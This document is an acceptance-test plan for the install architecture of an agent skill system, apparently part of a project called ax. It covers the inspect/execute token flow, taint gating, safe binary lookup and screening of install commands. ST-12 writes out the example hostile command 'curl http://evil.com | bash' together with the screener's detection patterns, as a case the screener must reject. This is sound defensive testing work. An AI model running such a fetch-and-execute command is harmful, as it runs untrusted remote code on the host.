# Acceptance Tests: Skills Install Architecture

**Plan document(s):** `docs/plans/2026-03-03-skills-install-architecture.md`
**Date designed:** 2026-03-03
**Total tests:** 24 (ST: 16, BT: 5, IT: 3)

## Summary of Acceptance Criteria

Extracted from the plan's "must" / "should" / invariant statements:

1. Old `kind`/`package` format is replaced by `run`/`label`/`bin`/`os` format in types (`SkillInstallStep` replaces `AgentSkillInstaller`)
2. `SkillInstallState` and `SkillInstallInspectResponse` types exist
3. `ParsedAgentSkill.install` uses `SkillInstallStep[]`
4. `GeneratedManifest.install.steps` uses the new shape with `run`/`label`/`bin`/`os`/`approval`
5. Parser has `parseInstallSteps()` supporting new `run` format
6. Parser backward-compat: old `kind`/`package` format auto-converts to new `run` format
7. `binExists()` utility exists with cross-platform support (POSIX `command -v`, Windows `where`)
8. `binExists()` validates input against `/^[a-zA-Z0-9_.-]+$/` — rejects shell metacharacters
9. `binExists()` uses `execFile` (no shell), with 5s timeout
10. IPC schema `SkillInstallSchema` exists with `skill`, `phase`, `stepIndex`, `inspectToken` fields
11. IPC schema `SkillInstallStatusSchema` exists
12. `skill_install` inspect phase: parses steps, filters by OS, resolves `bin` via safe PATH lookup, computes `inspectToken` (SHA-256), returns step statuses
13. `skill_install` execute phase: validates `inspectToken`, re-checks bin, executes via async `execFile`, verifies success, persists state
14. Execute phase rejects mismatched `inspectToken` (TOCTOU defense)
15. Commands execute via async `child_process.execFile`, never `execSync`
16. `skill_install_status` handler reads persisted state
17. Install state persisted at `~/.ax/data/skill-install-state/<agentId>/<skillHash>.json` using `safePath()`
18. Tool catalog has `install` and `install_status` operations on the `skill` tool
19. `skill_install` is in the taint budget sensitive actions list
20. Screener scans `run` fields for `curl | bash`, `$(...)`, backtick patterns
21. `skill_read` attaches warnings for missing `requires.bins`
22. `skill_list` attaches warnings for missing `requires.bins`
23. No commands execute before user approval (inspect phase uses only safe PATH lookups)
24. Agent passes skill name + step index + token, never the command string itself

---

## Structural Tests

### ST-1: SkillInstallStep type replaces AgentSkillInstaller

**Criterion:** "Replace `AgentSkillInstaller` → `SkillInstallStep`" (Plan §6)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §6 Type Changes

**Verification steps:**
1. Read `src/providers/skills/types.ts`
2. Check that `SkillInstallStep` interface exists with fields: `run: string`, `label?: string`, `bin?: string`, `os?: string[]`
3. Check that `AgentSkillInstaller` is removed or deprecated
4. Check that `ParsedAgentSkill.install` uses `SkillInstallStep[]`

**Expected outcome:**
- [ ] `SkillInstallStep` interface exists with `run`, `label`, `bin`, `os` fields
- [ ] `ParsedAgentSkill.install` is typed as `SkillInstallStep[]`
- [ ] `AgentSkillInstaller` is removed (or at minimum not used by `ParsedAgentSkill`)

**Pass/Fail:** _pending_

---

### ST-2: SkillInstallState and SkillInstallInspectResponse types exist

**Criterion:** "Add `SkillInstallState`, `SkillInstallInspectResponse`" (Plan §6)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §6 Type Changes

**Verification steps:**
1. Read `src/providers/skills/types.ts`
2. Check for `SkillInstallState` with fields: `agentId`, `skillName`, `inspectToken`, `steps[]` (with `run`, `status`, `updatedAt`, `output?`, `error?`), `status` enum, `updatedAt`
3. Check for `SkillInstallInspectResponse` with fields: `skill`, `status`, `inspectToken`, `binChecks[]`, `steps[]`

**Expected outcome:**
- [ ] `SkillInstallState` interface exists with all specified fields
- [ ] `SkillInstallInspectResponse` interface exists with all specified fields
- [ ] `SkillInstallState.steps[].status` includes `'pending' | 'skipped' | 'completed' | 'failed'`
- [ ] `SkillInstallState.status` includes `'not_started' | 'in_progress' | 'completed' | 'partial' | 'failed'`

**Pass/Fail:** _pending_

---

### ST-3: GeneratedManifest uses new install format

**Criterion:** "Update `GeneratedManifest.install.steps` shape" (Plan §6)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §6 Type Changes

**Verification steps:**
1. Read `src/providers/skills/types.ts` — check `GeneratedManifest` type
2. Read `src/utils/manifest-generator.ts` — check install steps mapping

**Expected outcome:**
- [ ] `GeneratedManifest.install.steps` has shape: `{ run, label?, bin?, os?, approval: 'required' }`
- [ ] Manifest generator maps `SkillInstallStep` fields (not old `kind`/`package`/`bins`)

**Pass/Fail:** _pending_

---

### ST-4: binExists utility exists with correct implementation

**Criterion:** "Cross-platform binary lookup... no shell execution" (Plan §4.1)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §4.1 Safe Binary Lookup

**Verification steps:**
1. Check that `src/utils/bin-exists.ts` exists
2. Read it and verify:
   - Input validation regex `/^[a-zA-Z0-9_.-]+$/`
   - Uses `execFile` (not `exec` or `execSync`)
   - POSIX: `command -v <name>`
   - Windows: `where <name>`
   - 5-second timeout
3. Check that `tests/utils/bin-exists.test.ts` exists

**Expected outcome:**
- [ ] `src/utils/bin-exists.ts` exists and exports `binExists(name: string): Promise<boolean>`
- [ ] Input validated against `/^[a-zA-Z0-9_.-]+$/` — returns `false` for shell metacharacters
- [ ] Uses `child_process.execFile` (no shell)
- [ ] Platform check: `command -v` on POSIX, `where` on Windows
- [ ] Timeout set to 5000ms
- [ ] Test file exists with metacharacter rejection tests

**Pass/Fail:** _pending_

---

### ST-5: Parser supports new run format

**Criterion:** "Replace `parseInstallSpecs()` with `parseInstallSteps()`" (Plan §7)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §7 Parser Changes

**Verification steps:**
1. Read `src/utils/skill-format-parser.ts`
2. Check for `parseInstallSteps()` function
3. Verify it handles: `run` (required), `label` (optional), `bin` (optional, singular string), `os` (optional array)

**Expected outcome:**
- [ ] `parseInstallSteps()` function exists
- [ ] Parses `run`, `label`, `bin`, `os` fields from YAML install steps
- [ ] `bin` is a single string (not an array)

**Pass/Fail:** _pending_

---

### ST-6: Parser backward-compat for old kind/package format

**Criterion:** "Include backward-compat conversion from old `kind`/`package` format" (Plan §7)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §7 Parser Changes

**Verification steps:**
1. Read `src/utils/skill-format-parser.ts`
2. Check that old format entries (`kind: brew`, `kind: node`, etc.) are converted:
   - `kind: brew, formula: X` → `run: "brew install X"`, `bin: first of bins[]`
   - `kind: node/npm, package: X` → `run: "npm install -g X"`, `bin: first of bins[]`
   - `kind: pip, package: X` → `run: "pip install X"`, `bin: first of bins[]`
   - `kind: go, package: X` → `run: "go install X@latest"`, `bin: first of bins[]`
   - `kind: cargo, package: X` → `run: "cargo install X"`, `bin: first of bins[]`
   - `kind: uv, package: X` → `run: "uv tool install X"`, `bin: first of bins[]`
3. Read `tests/utils/skill-format-parser.test.ts` for backward-compat test coverage

**Expected outcome:**
- [ ] All 7 old `kind` values are converted to appropriate `run` commands
- [ ] Old multi-bin `bins: [foo, bar]` uses first element as `bin: "foo"`
- [ ] Tests cover both new and old format parsing

**Pass/Fail:** _pending_

---

### ST-7: IPC schema for skill_install exists

**Criterion:** "`skill_install` schema with `phase`, `stepIndex`, `inspectToken`" (Plan §3)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §3 IPC Commands

**Verification steps:**
1. Read `src/ipc-schemas.ts`
2. Check for `SkillInstallSchema` with:
   - `skill: safeString(200)`
   - `phase: z.enum(['inspect', 'execute'])`
   - `stepIndex: z.number().int().min(0).max(50).optional()`
   - `inspectToken: safeString(128).optional()`
3. Check for `SkillInstallStatusSchema` with `skill: safeString(200)`
4. Both schemas use `.strict()` mode

**Expected outcome:**
- [ ] `SkillInstallSchema` registered in `IPC_SCHEMAS` with action `'skill_install'`
- [ ] `SkillInstallStatusSchema` registered with action `'skill_install_status'`
- [ ] `inspectToken` is optional (only required for execute phase)
- [ ] `stepIndex` is optional with int constraint, min 0, max 50

**Pass/Fail:** _pending_

---

### ST-8: IPC handlers for skill_install exist

**Criterion:** "Add `skill_install` and `skill_install_status` to `createSkillsHandlers()`" (Plan §9)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §9 Handler Changes

**Verification steps:**
1. Read `src/host/ipc-handlers/skills.ts`
2. Check that `createSkillsHandlers()` returns `skill_install` and `skill_install_status` handlers
3. Verify inspect phase computes `inspectToken` via SHA-256
4. Verify execute phase validates `inspectToken` before running
5. Verify async execution (no `execSync`)

**Expected outcome:**
- [ ] `skill_install` handler exists in `createSkillsHandlers()` return value
- [ ] `skill_install_status` handler exists
- [ ] Inspect phase uses `createHash('sha256')` on canonical JSON of filtered steps
- [ ] Execute phase compares provided `inspectToken` with recomputed hash
- [ ] Execute uses `execFile` or `execFileAsync` (not `execSync`)

**Pass/Fail:** _pending_

---

### ST-9: IPC server dispatches skill_install actions

**Criterion:** "Register new `skill_install` and `skill_install_status` in dispatch map" (Plan §9, §12)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §9 Handler Changes

**Verification steps:**
1. Read `src/host/ipc-server.ts`
2. Verify `createSkillsHandlers()` output is spread into the handlers map (already is — handlers will auto-register if `createSkillsHandlers` returns them)
3. Confirm no explicit exclusion of `skill_install` or `skill_install_status`

**Expected outcome:**
- [ ] `skill_install` is reachable via the IPC dispatch map
- [ ] `skill_install_status` is reachable via the IPC dispatch map
- [ ] Both actions have corresponding schemas in `IPC_SCHEMAS` for envelope validation

**Pass/Fail:** _pending_

---

### ST-10: Tool catalog includes install operations

**Criterion:** "Add `install` and `install_status` operations to the existing `skill` tool" (Plan §10)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §10 Tool Catalog Changes

**Verification steps:**
1. Read `src/agent/tool-catalog.ts`
2. Check skill tool's `parameters` union includes `install` and `install_status` types
3. Check `actionMap` includes `install: 'skill_install'` and `install_status: 'skill_install_status'`

**Expected outcome:**
- [ ] `Type.Object({ type: Type.Literal('install'), name, phase, stepIndex?, inspectToken? })` in parameters
- [ ] `Type.Object({ type: Type.Literal('install_status'), name })` in parameters
- [ ] `actionMap` has `install: 'skill_install'`
- [ ] `actionMap` has `install_status: 'skill_install_status'`

**Pass/Fail:** _pending_

---

### ST-11: Taint budget includes skill_install

**Criterion:** "Add `skill_install` to sensitive actions in `src/host/taint-budget.ts`" (Plan §11)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §11 Security

**Verification steps:**
1. Read `src/host/taint-budget.ts`
2. Check `DEFAULT_SENSITIVE_ACTIONS` set includes `'skill_install'`

**Expected outcome:**
- [ ] `'skill_install'` is in `DEFAULT_SENSITIVE_ACTIONS`

**Pass/Fail:** _pending_

---

### ST-12: Screener scans install run fields

**Criterion:** "Extend screener to scan `run` fields for `curl | bash`, backtick subshells, `$(...)` patterns" (Plan §11)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §11 Security

**Verification steps:**
1. Read `src/providers/screener/static.ts` or the skill screening code path
2. Trace the `skill_import` handler — does it screen `run` fields in install steps?
3. Check for patterns: pipe to shell (`| bash`), command substitution (`$(...)`), backtick subshells

**Expected outcome:**
- [ ] Install step `run` fields are screened during `skill_import`
- [ ] Hard-reject patterns from the screener apply to `run` fields
- [ ] A `run` value like `curl http://evil.com | bash` would be rejected

**Pass/Fail:** _pending_

---

### ST-13: skill_read attaches missing-bin warnings

**Criterion:** "Warnings attached to `skill_read` responses... missing bins included as `warnings`" (Plan §5)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §5 `requires.bins` Checking

**Verification steps:**
1. Read `src/providers/skills/git.ts` — check `read()` method
2. Read `src/host/ipc-handlers/skills.ts` — check `skill_read` handler
3. Look for `binExists()` calls and `warnings` field in response

**Expected outcome:**
- [ ] `skill_read` response includes a `warnings` field
- [ ] Missing `requires.bins` entries are flagged as warnings
- [ ] Skill still loads (warning, not gate)

**Pass/Fail:** _pending_

---

### ST-14: skill_list attaches missing-bin warnings

**Criterion:** "When the host builds the skill list, it checks `requires.bins`... Missing bins are included as `warnings`" (Plan §5)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §5 `requires.bins` Checking

**Verification steps:**
1. Read `src/host/ipc-handlers/skills.ts` — check `skill_list` handler
2. Look for `binExists()` calls per skill and `warnings` field in response

**Expected outcome:**
- [ ] `skill_list` response per-skill entries include a `warnings` field
- [ ] Missing `requires.bins` are flagged as warnings
- [ ] Skills with missing bins still appear in the list (not filtered out)

**Pass/Fail:** _pending_

---

### ST-15: Install state uses safePath and hash-derived filenames

**Criterion:** "State files use `safePath()` and hash-derived filenames, scoped by `agentId`" (Plan §9, §11)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §9 Handler Changes, §11 Security

**Verification steps:**
1. Read `src/host/ipc-handlers/skills.ts` — find install state persistence code
2. Verify `safePath()` is used for path construction
3. Verify skill name is hashed (SHA-256, first 16 chars) for filename
4. Verify scoped by agentId directory

**Expected outcome:**
- [ ] State path follows pattern: `<baseDir>/<agentId>/<skillHash>.json`
- [ ] `safePath()` imported and used for both agentId dir and skill file
- [ ] Skill name never used directly as filename — always hashed
- [ ] `createHash('sha256')` used on skill name, `.slice(0, 16)` for filename

**Pass/Fail:** _pending_

---

### ST-16: Async execution — no execSync

**Criterion:** "Install commands run via async `child_process.execFile`, never `execSync`" (Plan §4.2, §11)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §4.2 Async Command Execution

**Verification steps:**
1. Read `src/host/ipc-handlers/skills.ts`
2. Read `src/utils/bin-exists.ts`
3. Grep for `execSync` in both files — should find none
4. Grep for `execFile` or `execFileAsync` — should find the async variant

**Expected outcome:**
- [ ] Zero occurrences of `execSync` in install-related code
- [ ] `execFile` (promisified) or `execFileAsync` used for both `binExists` and command execution
- [ ] Command execution uses `/bin/sh -c` (POSIX) or `cmd.exe /c` (Windows)
- [ ] Timeout set to 300_000ms (5 min) per step for execute, 5000ms for binExists

**Pass/Fail:** _pending_

---

## Behavioral Tests

### BT-1: Agent can inspect install requirements for a skill

**Criterion:** "Phase 1: Inspect — agent calls `skill_install({ skill, phase: 'inspect' })`... Return step list with statuses and inspectToken" (Plan §4)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §4 Install Flow

**Setup:**
- Create a test skill in the skills directory with install steps in new `run` format
- Skill should have a `bin` field pointing to a binary that does NOT exist on the system (e.g., `bin: nonexistent-test-bin-xyz`)

**Chat script:**
1. Send: `Use the skill tool to inspect install requirements for the test skill. Call skill install with phase inspect.`
   Expected behavior: Agent calls `skill({ type: 'install', name: '<test-skill>', phase: 'inspect' })`
   Structural check: Response includes `inspectToken` (64-char hex string), step statuses showing `needed`, `binChecks` array

**Expected outcome:**
- [ ] Agent response includes install step details with `status: 'needed'`
- [ ] Response contains a SHA-256 `inspectToken` (64-character hex string)
- [ ] `binChecks` shows `found: false` for the nonexistent binary
- [ ] No commands were executed (only PATH lookup for bin check)

**Pass/Fail:** _pending_

---

### BT-2: Agent can execute an install step with valid token

**Criterion:** "Phase 2: Execute — after user approves, agent calls `skill_install({ skill, phase: 'execute', stepIndex, inspectToken })`" (Plan §4)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §4 Install Flow

**Setup:**
- Create a test skill with a harmless install step: `run: "echo 'test-install-success'"`, `bin: nonexistent-test-bin-xyz`
- First, have the agent inspect to get a valid `inspectToken`

**Chat script:**
1. Send: `Inspect install requirements for the test skill, then execute step 0 using the token you received.`
   Expected behavior: Agent first calls inspect, receives token, then calls execute with that token and stepIndex 0
   Structural check: Audit log contains `skill_install_inspect` and `skill_install_execute` entries; state file created

**Expected outcome:**
- [ ] Agent successfully executes the two-phase flow (inspect then execute)
- [ ] Execute returns success with stdout containing "test-install-success"
- [ ] Install state persisted to disk
- [ ] Audit log records both phases

**Pass/Fail:** _pending_

---

### BT-3: Execute rejects mismatched inspectToken

**Criterion:** "Reject if `inspectToken` doesn't match — skill content changed since inspect; agent must re-inspect" (Plan §4)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §4 Install Flow, §11 Security

**Setup:**
- Create a test skill with install steps
- Obtain a valid `inspectToken` via inspect phase

**Chat script:**
1. Send: `Call skill install execute for the test skill with stepIndex 0 and inspectToken "0000000000000000000000000000000000000000000000000000000000000000" (a fake token).`
   Expected behavior: Agent calls execute with the bogus token; host rejects with an error about token mismatch
   Structural check: No command was executed; audit log shows rejection

**Expected outcome:**
- [ ] Execute phase returns an error indicating token mismatch
- [ ] No install command was executed
- [ ] Agent informed it needs to re-inspect

**Pass/Fail:** _pending_

---

### BT-4: Tainted session cannot trigger skill_install

**Criterion:** "Tainted sessions can't trigger installs" (Plan §11)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §11 Security

**Setup:**
- Send a message that introduces taint (e.g., a message containing external content that gets taint-tagged)
- Verify session is tainted

**Chat script:**
1. Send: `[message that introduces taint, e.g., with external URL content]`
   Expected behavior: Session becomes tainted
2. Send: `Install the dependencies for skill X`
   Expected behavior: Agent attempts `skill_install` but it's blocked by taint budget
   Structural check: Taint budget log shows rejection of `skill_install`

**Expected outcome:**
- [ ] `skill_install` action is blocked in a tainted session
- [ ] Agent receives an error about taint restriction
- [ ] No install commands execute

**Pass/Fail:** _pending_

---

### BT-5: Agent sees missing-bin warnings when reading a skill

**Criterion:** "Warnings surface at skill_read response... missing bins included as warnings" (Plan §5)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §5 `requires.bins` Checking

**Setup:**
- Create a test skill with `requires.bins: [nonexistent-test-bin-xyz]`

**Chat script:**
1. Send: `Read the test skill using the skill tool.`
   Expected behavior: Agent calls `skill({ type: 'read', name: '<test-skill>' })` and receives the skill content with a warning about missing binary
   Structural check: Response includes `warnings` field with missing bin info

**Expected outcome:**
- [ ] Agent response mentions a warning about missing binary `nonexistent-test-bin-xyz`
- [ ] Skill content is still returned (not blocked)
- [ ] Warning is informational, not an error

**Pass/Fail:** _pending_

---

## Integration Tests

### IT-1: Full install lifecycle — inspect, execute, verify status

**Criterion:** "Two-phase design: inspect → execute... Persist state" (Plan §4, §9)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §4 Install Flow, §9 Handler Changes

**Setup:**
- Create a test skill with:
  ```yaml
  install:
    - run: "echo 'installed-marker' > /tmp/ax-test-install-marker"
      label: "Create test marker file"
      bin: nonexistent-test-bin-xyz
  ```
- Session ID: `acceptance:skills-install:it1`

**Sequence:**
1. [Inspect phase]
   Action: Send `Inspect the install requirements for skill 'test-install-skill'.`
   Verify: Response includes `inspectToken`, step with `status: needed`

2. [Execute phase]
   Action: Send `Execute install step 0 for 'test-install-skill' using the token from the inspect result.`
   Verify: Step executes, returns success with stdout

3. [Verify state persistence]
   Action: Send `Check the install status for skill 'test-install-skill'.`
   Verify: Status shows step as completed, overall status `completed` or `partial`

4. [Verify side effect]
   Action: Check `/tmp/ax-test-install-marker` exists and contains "installed-marker"
   Verify: File exists with expected content

**Expected final state:**
- [ ] All three IPC actions (`inspect`, `execute`, `install_status`) work end-to-end
- [ ] Install state file persisted at expected path under `skill-install-state/`
- [ ] Marker file created by the `run` command
- [ ] Audit log has entries for all phases

**Pass/Fail:** _pending_

---

### IT-2: Backward-compat — old kind/package skills parse and install

**Criterion:** "Include backward-compat conversion from old `kind`/`package` format" (Plan §7)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §7 Parser Changes

**Setup:**
- Create a test skill using the OLD format:
  ```yaml
  install:
    - kind: node
      package: cowsay
      bins: [cowsay]
  ```
- Session ID: `acceptance:skills-install:it2`

**Sequence:**
1. [Read skill to verify parsing]
   Action: Send `Read the test-legacy-install skill.`
   Verify: Skill loads without errors

2. [Inspect install requirements]
   Action: Send `Inspect install requirements for test-legacy-install skill.`
   Verify: Response shows converted step with `run: "npm install -g cowsay"`, `bin: "cowsay"`, and an `inspectToken`

3. [Verify backward-compat in manifest]
   Action: Check `manifest-generator.ts` output for old-format skill
   Verify: Generated manifest uses new `run`/`bin` shape, not old `kind`/`package`

**Expected final state:**
- [ ] Old `kind: node, package: cowsay, bins: [cowsay]` parsed into `run: "npm install -g cowsay"`, `bin: "cowsay"`
- [ ] `inspectToken` computed correctly over the converted steps
- [ ] No errors or format mismatches during the flow

**Pass/Fail:** _pending_

---

### IT-3: OS filtering — platform-specific steps filtered correctly

**Criterion:** "Filter by current OS... `os`: Platform filter — `linux`, `macos`, `windows`" (Plan §1, §4)
**Plan reference:** `2026-03-03-skills-install-architecture.md`, §1 New SKILL.md Install Format, §4 Install Flow

**Setup:**
- Create a test skill with platform-specific steps:
  ```yaml
  install:
    - run: "echo 'macos-step'"
      label: "macOS only step"
      os: [macos]
    - run: "echo 'linux-step'"
      label: "Linux only step"
      os: [linux]
    - run: "echo 'universal-step'"
      label: "Universal step"
  ```
- Session ID: `acceptance:skills-install:it3`

**Sequence:**
1. [Inspect with OS filtering]
   Action: Send `Inspect install requirements for the test-os-filter skill.`
   Verify: On macOS, response includes the macOS step and the universal step, but NOT the Linux step. (Vice versa on Linux.)

2. [Verify inspectToken covers only filtered steps]
   Action: Compare `inspectToken` — it should be a hash of the filtered steps, not all steps
   Verify: Token is deterministic for the current platform's filtered step set

**Expected final state:**
- [ ] Only platform-matching steps returned in inspect response
- [ ] Universal steps (no `os` field) always included
- [ ] Non-matching platform steps excluded
- [ ] `inspectToken` computed over filtered (not all) steps

**Pass/Fail:** _pending_
